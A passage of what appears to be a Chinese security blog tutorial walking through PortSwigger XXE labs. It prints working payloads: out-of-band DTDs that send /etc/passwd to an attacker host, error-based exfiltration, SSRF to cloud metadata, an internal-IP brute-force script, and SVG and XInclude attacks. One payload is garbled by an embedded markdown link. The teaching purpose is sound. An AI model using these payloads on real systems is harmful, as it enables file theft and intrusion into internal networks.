+<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接上 payload，并用 payload 加以理解</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM "http://ip/test.dtd">
+%remote;%int;%send;
+]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这是我们对要进行渗透的 payload，有三个参数 <code>%remote, %int, %send</code>；后面接的网站 <a target="_blank" rel="noopener" href="http://ip/test.dtd">http://ip/test.dtd</a> 是我们挂在服务器&#x2F;第三方网站的恶意 DTD。我们在这个第三方网站的恶意 DTD 中添加第二层恶意 DTD</p>
+<p><strong>test.dtd</strong></p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/BlindDTD.png" class="">
+
+<p>接着，<code>%int</code> 去调用 test.dtd 当中的 file，这里稍微慢一点，分析一下<code> % int &quot;&lt;!ENTITY % send SYSTEM &#39;http://ip:9999?p=%file;</code>；也就是 %file 在前面被定义，而 %file 则是恶意读取了文件，这里可以替换成 &#x2F;etc&#x2F;passwd 这类。</p>
+<p>如此一来，%int 成为了这个网站的恶意 DTD，在 %int 里面定义了一个 %send 的变量名称。由此，最后一个调用的参数 <code>%send</code> 就相当于我们在上面一个案例中的基础 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">send</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM 'http://ip:9999?p=file:///etc/passwd;'></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样，我们三层的 payload 经过抽丝剥茧，变成了一层简单的 payload。<br>接下来我们来看一道简单的 Port 靶场上的盲注</p>
+<blockquote>
+<h5 id="Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD"><a href="#Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD" class="headerlink" title="Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration">Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</a></h5></blockquote>
+<ul>
+<li>题目要求我们爆出 &#x2F;etc&#x2F;hostname 的文件</li>
+</ul>
+<p>依旧是在 Stock 界面进行抓包，同样是 XML 形式</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/BlindDTDBag.png" class="">
+
+<p>Port 里面的渗透测试是给我们第三方的服务器的，也就是 exploit server，但是在真正的渗透测试中，如果要测盲注的话，还是需要自己的服务器的。</p>
+<p>按照之前的思路，进行多层恶意 DTD 的构造，并把这个恶意 DTD 挂在第三方服务器上面。</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/BlindDTDServer.png" class="">
+
+<p>这里点 Store，因为存储之后，就等于你在你自己的服务器上面有了这个恶意的 DTD，一会儿复用即可。恶意 DTD 的 URL 我放在下面，每个人进靶场都是不一样的</p>
+<ul>
+<li>URL: <a target="_blank" rel="noopener" href="https://exploit-acbc1f081e35bba3c0a7180f0145001b.web-security-academy.net/exploit">https://exploit-acbc1f081e35bba3c0a7180f0145001b.web-security-academy.net/exploit</a></li>
+</ul>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/BlindDTDPayload.png" class="">
+
+<p>成功，我们 exploit 的 <code>/etc/hostname</code> 在 GET 请求参数中</p>
+<h4 id="3-报错型盲注"><a href="#3-报错型盲注" class="headerlink" title="(3) 报错型盲注"></a>(3) 报错型盲注</h4><ul>
+<li><p>报错型注入是基于 “<strong>多个 DTD 的调用攻击</strong>“</p>
+</li>
+<li><p>攻击思路；和 “<strong>多个 DTD 的调用攻击</strong>“ 大部分一致，稍有不同</p>
+</li>
+</ul>
+<p><strong>evil.dtd</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"> 
+&lt;!ENTITY % eval "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> exfil SYSTEM 'file:///invalid/%file;'>"> 
+%eval; 
+%exfil;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>攻击的 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">&lt;!DOCTYPE foo [&lt;!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM "YOUR-DTD-URL"> 
+%xxe;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>剖析一下</p>
+</blockquote>
+<p>先调用 <code>&amp;xxe;</code>，<code>&amp;xxe;</code> 去调用上面的恶意 DTD，恶意 DTD 调用了 <code>file:///etc/passwd</code> 这一操作，这一操作，又被 <code>&amp;eval</code> 中的内容又会在 <code>&amp;exfil</code> 中的 <code>&#39;file:///invalid/%file;&#39;</code> 所调用。但是 invalid&#x2F;%file 后面的内容一定是报错的，这个报错消息反而会被带出来。</p>
+<p>这也就是 XXE 盲注中的报错注入</p>
+<blockquote>
+<h5 id="Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages"><a href="#Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages" class="headerlink" title="Lab: Exploiting blind XXE to retrieve data via error messages"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages">Lab: Exploiting blind XXE to retrieve data via error messages</a></h5></blockquote>
+<p>根据上述的方法，先在 exploit server 中投放恶意 DTD，再在抓包界面进行调用第三方服务器上的 DTD，便可造成报错注入。</p>
+<h3 id="3-利用-XXE-执行-SSRF"><a href="#3-利用-XXE-执行-SSRF" class="headerlink" title="3. 利用 XXE 执行 SSRF"></a>3. 利用 XXE 执行 SSRF</h3><h4 id="书说上文的-file-协议"><a href="#书说上文的-file-协议" class="headerlink" title="书说上文的 file 协议"></a>书说上文的 file 协议</h4><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求。</p>
+<p>我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？</p>
+<p>没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
+<h4 id="新的利用方式"><a href="#新的利用方式" class="headerlink" title="新的利用方式"></a>新的利用方式</h4><p>不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议。</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/DiffProtocol.png" class="">
+
+<p>我们的 payload 一般长这样</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY xxe SYSTEM "http://对方的内网IP"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span>
+    <span class="token entity named-entity" title="&xxe;">&amp;xxe;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当我们无法确定对方的具体 IP 时，可以通过 EXP 的方式进行探测。这里借用 K0rz3n 师傅的 EXP</p>
+<h5 id="内网-IP-爆破"><a href="#内网-IP-爆破" class="headerlink" title="内网 IP 爆破"></a>内网 IP 爆破</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+
+<span class="token comment">#Origtional XML that the server accepts</span>
+<span class="token comment">#&lt;xml></span>
+<span class="token comment">#    &lt;stuff>user&lt;/stuff></span>
+<span class="token comment">#&lt;/xml></span>
+
+
+<span class="token keyword">def</span> <span class="token function">build_xml</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?>"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY >"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY xxe SYSTEM """</span> <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> string <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""">]>"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;xml>"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""    &lt;stuff>&amp;xxe;&lt;/stuff>"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;/xml>"""</span>
+    send_xml<span class="token punctuation">(</span>xml<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">send_xml</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/xml'</span><span class="token punctuation">&#125;</span>
+    x <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'存在 XXE 的 URL'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text 
+    coded_string <span class="token operator">=</span> x<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment"># a little split to get only the base64 encoded value</span>
+    <span class="token keyword">print</span> coded_string
+<span class="token comment">#   print base64.b64decode(coded_string)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+        ip <span class="token operator">=</span> <span class="token string">'10.0.0.'</span> <span class="token operator">+</span> i <span class="token comment"># 对应的内网 IP 地址</span>
+        string <span class="token operator">=</span> <span class="token string">'php://filter/convert.base64-encode/resource=http://'</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">'/'</span>
+        <span class="token keyword">print</span> string
+        build_xml<span class="token punctuation">(</span>string<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+<span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h5 id="内网端口爆破"><a href="#内网端口爆破" class="headerlink" title="内网端口爆破"></a>内网端口爆破</h5><p>端口的爆破可以使用 Burpsuite 来完成</p>
+<p><strong>比如我们传入：</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>  
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">data</span> <span class="token name">SYSTEM</span> <span class="token string">"http://127.0.0.1:515/"</span> <span class="token punctuation">[</span><span class="token internal-subset">  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">data</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>data</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对端口号添加引用符，放置于 Burpsuite Intruder 当中爆破。</p>
+<blockquote>
+<h5 id="靶场：Lab-Exploiting-XXE-to-perform-SSRF-attacks"><a href="#靶场：Lab-Exploiting-XXE-to-perform-SSRF-attacks" class="headerlink" title="靶场：Lab: Exploiting XXE to perform SSRF attacks"></a>靶场：Lab: Exploiting XXE to perform SSRF attacks</h5></blockquote>
+<p>常规抓包</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/xxe_SSRF.png" class="">
+
+<p>构造 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stockCheck</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>productId</span><span class="token punctuation">></span></span>
+        <span class="token entity named-entity" title="&xxe;">&amp;xxe;</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>productId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>storeId</span><span class="token punctuation">></span></span>
+        1
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>storeId</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stockCheck</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里 169.254.169.254 是对方服务器的 IP</p>
+<ul>
+<li>发包之后，回显是 400，告诉我们 “Invalid product ID: latest”；再进一步添加接口。</li>
+</ul>
+<p>一步步添加接口，直至出现回显数据为止，这种 SSRF 只能够读取到文件，个人认为危害性一般。</p>
+<h3 id="4-XXE-与文件上传结合"><a href="#4-XXE-与文件上传结合" class="headerlink" title="4. XXE 与文件上传结合"></a>4. XXE 与文件上传结合</h3><h4 id="1-使用-svg-上传图片"><a href="#1-使用-svg-上传图片" class="headerlink" title="(1) 使用 svg 上传图片"></a>(1) 使用 svg 上传图片</h4><ul>
+<li>SVG 图片是一种基于 XML 语法的图像格式，是一种矢量图。</li>
+</ul>
+<p>那么我们结合文件上传的功能，可以在 SVG 中编辑 XML 语句，从而达到 XXE 的攻击效果。</p>
+<p>一般的 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" standalone="yes"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" > </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>128px<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>128px<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xlink<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">font-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16<span class="token punctuation">"</span></span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+
+ <span class="token entity named-entity" title="&xxe;">&amp;xxe;</span>
+
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样一来，我们想要知道的信息就能够被暴露在上传的图片当中，也就是此 SVG 图片中。</p>
+<blockquote>
+<h5 id="Lab-Exploiting-XXE-via-image-file-upload"><a href="#Lab-Exploiting-XXE-via-image-file-upload" class="headerlink" title="Lab: Exploiting XXE via image file upload"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload">Lab: Exploiting XXE via image file upload</a></h5></blockquote>
+<p>前往 blog 的评论区界面，先事先创建好 1.svg，并在 SVG 文件当中编辑如下，作为我们的 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" standalone="yes"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" > </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>128px<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>128px<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xlink<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">font-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16<span class="token punctuation">"</span></span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+ <span class="token entity named-entity" title="&xxe;">&amp;xxe;</span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上传后，我们的 SVG 图片中突然多了些许文字，点进去查看即可解题。</p>
+<h4 id="2-利用-jar-x2F-x2F-协议的攻击"><a href="#2-利用-jar-x2F-x2F-协议的攻击" class="headerlink" title="(2) 利用 jar:&#x2F;&#x2F; 协议的攻击"></a>(2) 利用 jar:&#x2F;&#x2F; 协议的攻击</h4><blockquote>
+<p>这一段内容参考于 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-14">K0rz3n 师傅的文章</a></p>
+</blockquote>
+<p><strong>jar:&#x2F;&#x2F; 协议的格式：</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">jar<span class="token operator">:</span><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>实例：</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">jar<span class="token operator">:</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>host<span class="token operator">/</span>application<span class="token punctuation">.</span>jar<span class="token operator">!</span><span class="token operator">/</span>file<span class="token operator">/</span>within<span class="token operator">/</span>the<span class="token operator">/</span>zip
+
+<span class="token operator">!</span> 后面就是其需要从中解压出的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>jar 协议处理文件的过程：</strong></p>
+<p>(1) 下载 jar&#x2F;zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
+<blockquote>
+<p>因为在 java 中 file:&#x2F;&#x2F;&#x2F; 协议可以起到列目录的作用，所以我们能用 file:&#x2F;&#x2F;&#x2F; 协议配合 jar:&#x2F;&#x2F; 协议使用</p>
+</blockquote>
+<p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p>
+<pre class="line-numbers language-none"><code class="language-none">jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题。</p>
+<h3 id="5-利用-XInclude-攻击"><a href="#5-利用-XInclude-攻击" class="headerlink" title="5. 利用 XInclude 攻击"></a>5. 利用 XInclude 攻击</h3><p>利用 XInclude 攻击的方式比起最粗暴的定义 <code>DOCTYPE</code> 来说更加含蓄些许，当我们无法直接定义 <code>DOCTYPE</code> 的时候才会转而向 XInclude 攻击；且要求后端采用的是 SOAP 协议。</p>
+<ul>
+<li>先说说 SOAP 协议吧，也不难理解。</li>
+</ul>
+<p>SOAP 协议在接收到请求后，SOAP 消息必须以 XML 文档的形式返回，所以要以 SOAP 协议作为后端的 Web 界面才会存在 XXE 的隐患。</p>
+<p>XInclude 攻击的 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XInclude<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>不同的是，这里我们被禁止定义 <code>DOCTYPE</code>，所以要对 Web 元素下手。</p>
+<blockquote>
+<h5 id="Lab-Exploiting-XInclude-to-retrieve-files"><a href="#Lab-Exploiting-XInclude-to-retrieve-files" class="headerlink" title="Lab: Exploiting XInclude to retrieve files"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-xinclude-attack">Lab: Exploiting XInclude to retrieve files</a></h5></blockquote>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/XincludeXXE.png" class="">
+
+<h3 id="6-别样的利用方式，复用本地-DTD"><a href="#6-别样的利用方式，复用本地-DTD" class="headerlink" title="6. 别样的利用方式，复用本地 DTD"></a>6. 别样的利用方式，复用本地 DTD</h3><p>这种攻击手段，一般是源于服务器与 VPS 之间存在防火墙，导致数据无法带出。</p>
+<ul>
+<li>利用出发点：由于许多包含 DTD 文件的常见 CMS 都是开源的，我们需要寻找要攻击的服务器上的 DTD 文件。</li>
+</ul>
+<p>这个方法只需要知道本地DTD文件的路径，并且在该DTD中定义了实体变量并且进行了引用。</p>
+<p>比如在ubuntu16.04中，我使用全局搜索得到以下的一些原生dtd文件：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//find / name <span class="token string">"*.dtd"</span>
+ 
+/usr/share/sgml/metacity-common/metacity-theme.dtd
+/usr/share/sgml/dtd/xml-core/catalog.dtd
+/usr/share/sgml/gconf/gconf-1.0.dtd
+/usr/share/gdb/syscalls/gdb-syscalls.dtd
+/usr/share/djvu/pubtext/DjVuOCR.dtd
+/usr/share/djvu/pubtext/DjVuMessages.dtd
+/usr/share/djvu/pubtext/DjVuXML-s.dtd
+/usr/share/avahi/avahi-service.dtd
+/usr/share/glib-2.0/schemas/gschema.dtd
+/usr/share/X11/xkb/rules/xkb.dtd
+/usr/share/doc/libxml-parser-perl/examples/ctest.dtd
+/usr/share/xml/schema/xml-core/tr9401.dtd
+/usr/share/xml/schema/xml-core/catalog.dtd
+/usr/share/gtksourceview-3.0/language-specs/language.dtd
+/usr/share/yelp/dtd/docbookx.dtd
+/usr/share/mobile-broadband-provider-info/serviceproviders.2.dtd
+/usr/share/libgweather/locations.dtd
+/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里使用sip-app_1_0.dtd为例，内容如下。</p>
